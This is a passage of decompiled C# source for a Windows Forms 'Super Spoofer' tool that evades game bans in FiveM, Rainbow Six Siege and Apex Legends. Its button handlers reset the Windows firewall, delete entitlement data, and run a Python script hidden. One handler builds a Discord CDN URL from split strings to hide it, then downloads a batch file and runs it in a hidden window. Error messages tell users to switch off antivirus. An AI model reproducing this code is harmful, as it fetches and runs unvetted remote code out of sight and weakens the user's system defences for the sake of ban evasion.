				Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DigitalEntitlements", true);
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
			}
			await Task.Delay(1000);
			listBox1.Items.Add("[+] We have now spoofed, blocked FiveM, Cleared DigitalEntitlements");
			await Task.Delay(500);
			listBox1.Items.Clear();
			listBox1.Items.Add("[!] Start FiveM, and click the GREEN button as soon as you have loaded onto FiveM!");
			siticoneButton4.Visible = true;
		}

		private void siticoneButton3Click(object sender, EventArgs param_328)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/930592856937218118/930839642092216320/FiveM.txt", "C:\\method.txt");
				Process.Start("C:\\method.txt");
			}
			catch (Exception)
			{
				MessageBox.Show("Cannot download method, please put on C:\\ drive or turn antivirus off!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void siticoneButton2Click(object sender, EventArgs param_330)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter("C:\\Windows\\SuperProj\\Drive\\firewallreset.cmd"))
					streamWriter.WriteLine("netsh advfirewall reset");
				Process.Start("C:\\Windows\\SuperProj\\Drive\\firewallreset.cmd");
				MessageBox.Show("We have reset the firewall! All defaults are now set back, spoof when ready!", "Super Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Cannot reset firewall, please put on C:\\ drive or turn antivirus off!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void siticoneButton5Click(object sender, EventArgs param_332)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\fivem_steam.py";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				MessageBox.Show("We have cleared instances from firewall!", "Super Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Cannot clear instances, download python and set to default open (In method) or turn antivirus off!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void siticoneButton6Click(object sender, EventArgs param_334)
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/884872400766922762";
				string text3 = ".bat";
				string text4 = "/890643919497478144/X";
				string text5 = "BOX";
				new WebClient().DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\XBOX.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\XBOX.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed XBOX and unlinked from FiveM!", "Super Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not complete function [XBOX-UNLINK] the main error would be that we cannot download the cleaner, then antivirus off and try again!", "Super Spoofer - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void siticoneButton7Click(object sender, EventArgs param_336)
		{
			new fivembuildchanger().ShowDialog();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.dashboard > AssistantHelper.dashboard)
				((IDisposable)this.dashboard).Dispose();
			base.Dispose(disposing);
		}

		private void DisposeNetwork()
		{
			this.dashboard = (Timer)(object)new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(gamespoofer));
			siticoneGroupBox3 = new SiticoneGroupBox();
			panel2 = new Panel();
			siticoneGroupBox1 = new SiticoneGroupBox();
			siticoneButton7 = new SiticoneButton();
			siticoneButton6 = new SiticoneButton();
			siticoneButton5 = new SiticoneButton();
			siticoneButton4 = new SiticoneButton();
			siticoneButton1 = new SiticoneButton();
			siticoneButton3 = new SiticoneButton();
			siticoneButton2 = new SiticoneButton();
			listBox1 = new ListBox();
			pictureBox1 = new PictureBox();
			panel1 = new Panel();
			siticoneGroupBox6 = new SiticoneGroupBox();
			rs = new SiticoneRoundedButton();
			rspermb = new SiticoneRadioButton();
			rstempb = new SiticoneRadioButton();
			pictureBox8 = new PictureBox();
			siticoneGroupBox7 = new SiticoneGroupBox();
			apex = new SiticoneRoundedButton();
			apexpermb = new SiticoneRadioButton();
			apextempb = new SiticoneRadioButton();
			pictureBox5 = new PictureBox();
			dashboard = new Timer((IContainer)this.dashboard);
			siticoneGroupBox3.SuspendLayout();
			siticoneGroupBox1.SuspendLayout();
			((ISupportInitialize)pictureBox1).BeginInit();
			siticoneGroupBox6.SuspendLayout();
			((ISupportInitialize)pictureBox8).BeginInit();
			siticoneGroupBox7.SuspendLayout();
			((ISupportInitialize)pictureBox5).BeginInit();
			SuspendLayout();
			siticoneGroupBox3.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox3.Controls.Add(panel2);
			siticoneGroupBox3.Controls.Add(siticoneGroupBox1);
			siticoneGroupBox3.Controls.Add(listBox1);
			siticoneGroupBox3.Controls.Add(pictureBox1);
			siticoneGroupBox3.Controls.Add(panel1);
			siticoneGroupBox3.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox3.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox3.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox3.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox3.Location = new Point(12, 9);
			siticoneGroupBox3.Name = "siticoneGroupBox3";
			siticoneGroupBox3.ShadowDecoration.Parent = siticoneGroupBox3;
			siticoneGroupBox3.Size = new Size(849, 385);
			siticoneGroupBox3.TabIndex = 96;
			siticoneGroupBox3.Text = "FiveM Spoofer";
			siticoneGroupBox3.Click += siticoneGroupBox3Click;
			panel2.BackColor = Color.Gainsboro;
			panel2.Location = new Point(-24, 112);
			panel2.Name = "panel2";
			panel2.Size = new Size(896, 1);
			panel2.TabIndex = 103;
			siticoneGroupBox1.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox1.Controls.Add(siticoneButton7);
			siticoneGroupBox1.Controls.Add(siticoneButton6);
			siticoneGroupBox1.Controls.Add(siticoneButton5);
			siticoneGroupBox1.Controls.Add(siticoneButton4);
			siticoneGroupBox1.Controls.Add(siticoneButton1);
			siticoneGroupBox1.Controls.Add(siticoneButton3);
			siticoneGroupBox1.Controls.Add(siticoneButton2);
			siticoneGroupBox1.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox1.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox1.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox1.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox1.Location = new Point(12, 243);
			siticoneGroupBox1.Name = "siticoneGroupBox1";
			siticoneGroupBox1.ShadowDecoration.Parent = siticoneGroupBox1;
			siticoneGroupBox1.Size = new Size(825, 128);
			siticoneGroupBox1.TabIndex = 102;
			siticoneGroupBox1.Text = "Spoofing Settings";
			siticoneButton7.CheckedState.Parent = siticoneButton7;
			siticoneButton7.CustomImages.Parent = siticoneButton7;
			siticoneButton7.FillColor = Color.DarkRed;
			siticoneButton7.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton7.ForeColor = Color.White;
			siticoneButton7.HoveredState.Parent = siticoneButton7;
			siticoneButton7.Location = new Point(522, 89);
			siticoneButton7.Name = "siticoneButton7";
			siticoneButton7.ShadowDecoration.Parent = siticoneButton7;
			siticoneButton7.Size = new Size(143, 26);
			siticoneButton7.TabIndex = 11;
			siticoneButton7.Text = "Change Build";
			siticoneButton7.Click += siticoneButton7Click;
			siticoneButton6.CheckedState.Parent = siticoneButton6;
			siticoneButton6.CustomImages.Parent = siticoneButton6;
			siticoneButton6.FillColor = Color.DarkRed;
			siticoneButton6.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton6.ForeColor = Color.White;
			siticoneButton6.HoveredState.Parent = siticoneButton6;
			siticoneButton6.Location = new Point(522, 57);
			siticoneButton6.Name = "siticoneButton6";
			siticoneButton6.ShadowDecoration.Parent = siticoneButton6;
			siticoneButton6.Size = new Size(143, 26);
			siticoneButton6.TabIndex = 10;
			siticoneButton6.Text = "Unlink Xbox";
			siticoneButton6.Click += siticoneButton6Click;
			siticoneButton5.CheckedState.Parent = siticoneButton5;
			siticoneButton5.CustomImages.Parent = siticoneButton5;
			siticoneButton5.FillColor = Color.DarkRed;
			siticoneButton5.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton5.ForeColor = Color.White;
			siticoneButton5.HoveredState.Parent = siticoneButton5;
			siticoneButton5.Location = new Point(671, 57);
			siticoneButton5.Name = "siticoneButton5";
			siticoneButton5.ShadowDecoration.Parent = siticoneButton5;
			siticoneButton5.Size = new Size(143, 26);
			siticoneButton5.TabIndex = 9;
			siticoneButton5.Text = "Clear Instances";
			siticoneButton5.Click += siticoneButton5Click;
			siticoneButton4.CheckedState.Parent = siticoneButton4;
			siticoneButton4.CustomImages.Parent = siticoneButton4;
			siticoneButton4.FillColor = Color.Green;
			siticoneButton4.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton4.ForeColor = Color.White;
			siticoneButton4.HoveredState.Parent = siticoneButton4;
			siticoneButton4.Location = new Point(10, 48);
			siticoneButton4.Name = "siticoneButton4";
			siticoneButton4.ShadowDecoration.Parent = siticoneButton4;
			siticoneButton4.Size = new Size(345, 26);
			siticoneButton4.TabIndex = 8;
			siticoneButton4.Text = "I have loaded onto FiveM - Click me before joining a server!";
			siticoneButton4.Visible = false;
			siticoneButton4.Click += siticoneButton4Click;
			siticoneButton1.CheckedState.Parent = siticoneButton1;
			siticoneButton1.CustomImages.Parent = siticoneButton1;
			siticoneButton1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton1.ForeColor = Color.White;
			siticoneButton1.HoveredState.Parent = siticoneButton1;
			siticoneButton1.Location = new Point(10, 48);
			siticoneButton1.Name = "siticoneButton1";
			siticoneButton1.ShadowDecoration.Parent = siticoneButton1;
			siticoneButton1.Size = new Size(174, 26);
			siticoneButton1.TabIndex = 5;
			siticoneButton1.Text = "Start Spoofing FiveM";
			siticoneButton1.Click += siticoneButton1Click;
			siticoneButton3.CheckedState.Parent = siticoneButton3;
			siticoneButton3.CustomImages.Parent = siticoneButton3;
			siticoneButton3.FillColor = Color.Gray;
			siticoneButton3.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton3.ForeColor = Color.White;
			siticoneButton3.HoveredState.Parent = siticoneButton3;
			siticoneButton3.Location = new Point(190, 48);
			siticoneButton3.Name = "siticoneButton3";
			siticoneButton3.ShadowDecoration.Parent = siticoneButton3;
			siticoneButton3.Size = new Size(143, 26);
			siticoneButton3.TabIndex = 7;
			siticoneButton3.Text = "Download Method";
			siticoneButton3.Click += siticoneButton3Click;
			siticoneButton2.CheckedState.Parent = siticoneButton2;
			siticoneButton2.CustomImages.Parent = siticoneButton2;
			siticoneButton2.FillColor = Color.DarkRed;
			siticoneButton2.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			siticoneButton2.ForeColor = Color.White;
			siticoneButton2.HoveredState.Parent = siticoneButton2;
			siticoneButton2.Location = new Point(671, 89);
			siticoneButton2.Name = "siticoneButton2";
			siticoneButton2.ShadowDecoration.Parent = siticoneButton2;
			siticoneButton2.Size = new Size(143, 26);
			siticoneButton2.TabIndex = 6;
			siticoneButton2.Text = "Reset Firewall";
			siticoneButton2.Click += siticoneButton2Click;
			listBox1.BackColor = Color.FromArgb(25, 26, 30);
			listBox1.BorderStyle = BorderStyle.None;
			listBox1.Font = new Font("Courier New", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			listBox1.ForeColor = Color.White;
			listBox1.FormattingEnabled = true;
			listBox1.ItemHeight = 16;
			listBox1.Items.AddRange(new object[1] { "Waiting for user interaction..." });
			listBox1.Location = new Point(6, 120);
			listBox1.Name = "listBox1";
			listBox1.Size = new Size(834, 96);
			listBox1.TabIndex = 3;
			listBox1.SelectedIndexChanged += NavigateWindow;
			pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
			pictureBox1.Location = new Point(6, 43);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new Size(834, 63);
			pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 1;
			pictureBox1.TabStop = false;
			pictureBox1.Click += pictureBox1Click;
			panel1.BackColor = Color.Gainsboro;
			panel1.Location = new Point(-4, 225);
			panel1.Name = "panel1";
			panel1.Size = new Size(896, 1);
			panel1.TabIndex = 4;
			siticoneGroupBox6.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox6.Controls.Add(rs);
			siticoneGroupBox6.Controls.Add(rspermb);
			siticoneGroupBox6.Controls.Add(rstempb);
			siticoneGroupBox6.Controls.Add(pictureBox8);
			siticoneGroupBox6.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox6.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox6.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox6.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox6.Location = new Point(642, 416);
			siticoneGroupBox6.Name = "siticoneGroupBox6";
			siticoneGroupBox6.ShadowDecoration.Parent = siticoneGroupBox6;
			siticoneGroupBox6.Size = new Size(219, 169);
			siticoneGroupBox6.TabIndex = 101;
			siticoneGroupBox6.Text = "RS6 SPOOFER";
			rs.CheckedState.Parent = rs;
			rs.Cursor = Cursors.Hand;
			rs.CustomImages.Parent = rs;
			rs.FillColor = Color.FromArgb(7, 6, 24);
			rs.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
			rs.ForeColor = Color.White;
			rs.HoveredState.Parent = rs;
			rs.Location = new Point(6, 142);
			rs.Name = "rs";
			rs.ShadowDecoration.Parent = rs;
			rs.Size = new Size(207, 20);
			rs.TabIndex = 97;
			rs.Text = "Spoof Rainbow Six Seige";
			rs.Click += rsClick;
			rspermb.AutoCheck = false;
			rspermb.AutoSize = true;
			rspermb.CheckedState.BorderColor = Color.Lime;
			rspermb.CheckedState.BorderThickness = 1;
			rspermb.CheckedState.FillColor = Color.DarkGreen;
			rspermb.CheckedState.InnerColor = Color.DarkGreen;
			rspermb.CheckedState.InnerOffset = 1;
			rspermb.Location = new Point(118, 112);
			rspermb.Name = "rspermb";
			rspermb.RightToLeft = RightToLeft.No;
			rspermb.Size = new Size(92, 19);
			rspermb.TabIndex = 98;
			rspermb.Text = "Permanently";
			rspermb.TextAlign = ContentAlignment.MiddleRight;
			rspermb.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			rspermb.UncheckedState.BorderThickness = 2;
			rspermb.UncheckedState.FillColor = Color.Transparent;
			rspermb.UncheckedState.InnerColor = Color.Transparent;
			rspermb.UseVisualStyleBackColor = true;
			rstempb.AutoCheck = false;
			rstempb.AutoSize = true;
			rstempb.CheckedState.BorderColor = Color.Lime;
			rstempb.CheckedState.BorderThickness = 1;
			rstempb.CheckedState.FillColor = Color.DarkGreen;
			rstempb.CheckedState.InnerColor = Color.DarkGreen;
			rstempb.CheckedState.InnerOffset = 1;
			rstempb.Location = new Point(6, 112);
			rstempb.Name = "rstempb";
			rstempb.Size = new Size(81, 19);
			rstempb.TabIndex = 97;
			rstempb.Text = "Temporary";
			rstempb.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			rstempb.UncheckedState.BorderThickness = 2;
			rstempb.UncheckedState.FillColor = Color.Transparent;
			rstempb.UncheckedState.InnerColor = Color.Transparent;
			rstempb.UseVisualStyleBackColor = true;
			pictureBox8.Image = (Image)componentResourceManager.GetObject("pictureBox8.Image");
			pictureBox8.Location = new Point(6, 45);
			pictureBox8.Name = "pictureBox8";
			pictureBox8.Size = new Size(207, 61);
			pictureBox8.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox8.TabIndex = 1;
			pictureBox8.TabStop = false;
			siticoneGroupBox7.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox7.Controls.Add(apex);
			siticoneGroupBox7.Controls.Add(apexpermb);
			siticoneGroupBox7.Controls.Add(apextempb);
			siticoneGroupBox7.Controls.Add(pictureBox5);
			siticoneGroupBox7.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox7.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox7.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox7.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox7.Location = new Point(12, 416);
			siticoneGroupBox7.Name = "siticoneGroupBox7";
			siticoneGroupBox7.ShadowDecoration.Parent = siticoneGroupBox7;
			siticoneGroupBox7.Size = new Size(219, 169);
			siticoneGroupBox7.TabIndex = 100;
			siticoneGroupBox7.Text = "APEX LEGENDS SPOOFER";
			apex.CheckedState.Parent = apex;
			apex.Cursor = Cursors.Hand;
			apex.CustomImages.Parent = apex;
			apex.FillColor = Color.FromArgb(7, 6, 24);
			apex.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
			apex.ForeColor = Color.White;
			apex.HoveredState.Parent = apex;
			apex.Location = new Point(6, 142);
			apex.Name = "apex";
			apex.ShadowDecoration.Parent = apex;
			apex.Size = new Size(207, 20);
			apex.TabIndex = 97;
			apex.Text = "Spoof Apex Legends";
			apex.Click += apexClick;
			apexpermb.AutoCheck = false;
			apexpermb.AutoSize = true;
			apexpermb.CheckedState.BorderColor = Color.Lime;
			apexpermb.CheckedState.BorderThickness = 1;
			apexpermb.CheckedState.FillColor = Color.DarkGreen;
			apexpermb.CheckedState.InnerColor = Color.DarkGreen;
			apexpermb.CheckedState.InnerOffset = 1;
			apexpermb.Location = new Point(118, 112);
			apexpermb.Name = "apexpermb";
			apexpermb.RightToLeft = RightToLeft.No;
			apexpermb.Size = new Size(92, 19);
			apexpermb.TabIndex = 98;
			apexpermb.Text = "Permanently";
			apexpermb.TextAlign = ContentAlignment.MiddleRight;
			apexpermb.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			apexpermb.UncheckedState.BorderThickness = 2;
			apexpermb.UncheckedState.FillColor = Color.Transparent;
			apexpermb.UncheckedState.InnerColor = Color.Transparent;
			apexpermb.UseVisualStyleBackColor = true;
			apextempb.AutoCheck = false;
			apextempb.AutoSize = true;
			apextempb.CheckedState.BorderColor = Color.Lime;
			apextempb.CheckedState.BorderThickness = 1;
			apextempb.CheckedState.FillColor = Color.DarkGreen;
			apextempb.CheckedState.InnerColor = Color.DarkGreen;
			apextempb.CheckedState.InnerOffset = 1;
			apextempb.Location = new Point(6, 112);
			apextempb.Name = "apextempb";
			apextempb.Size = new Size(81, 19);
			apextempb.TabIndex = 97;
			apextempb.Text = "Temporary";
			apextempb.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			apextempb.UncheckedState.BorderThickness = 2;
			apextempb.UncheckedState.FillColor = Color.Transparent;
			apextempb.UncheckedState.InnerColor = Color.Transparent;
			apextempb.UseVisualStyleBackColor = true;
			pictureBox5.Image = (Image)componentResourceManager.GetObject("pictureBox5.Image");
			pictureBox5.Location = new Point(6, 45);
			pictureBox5.Name = "pictureBox5";
			pictureBox5.Size = new Size(207, 61);
			pictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox5.TabIndex = 1;
			pictureBox5.TabStop = false;
			pictureBox5.Click += pictureBox5Click;
			dashboard.Interval = 10;
			dashboard.Tick += TestFunction;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			BackColor = Color.FromArgb(25, 26, 30);
			base.ClientSize = new Size(873, 597);
			base.Controls.Add(siticoneGroupBox7);
			base.Controls.Add(siticoneGroupBox6);
			base.Controls.Add(siticoneGroupBox3);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "gamespoofer";
			Text = "gamespoofer";
			base.Load += gamespooferLoad;
			siticoneGroupBox3.ResumeLayout(false);
			siticoneGroupBox1.ResumeLayout(false);
			((ISupportInitialize)pictureBox1).EndInit();
			siticoneGroupBox6.ResumeLayout(false);
			siticoneGroupBox6.PerformLayout();
			((ISupportInitialize)pictureBox8).EndInit();
			siticoneGroupBox7.ResumeLayout(false);
			siticoneGroupBox7.PerformLayout();
			((ISupportInitialize)pictureBox5).EndInit();
			ResumeLayout(false);
		}
	}
}
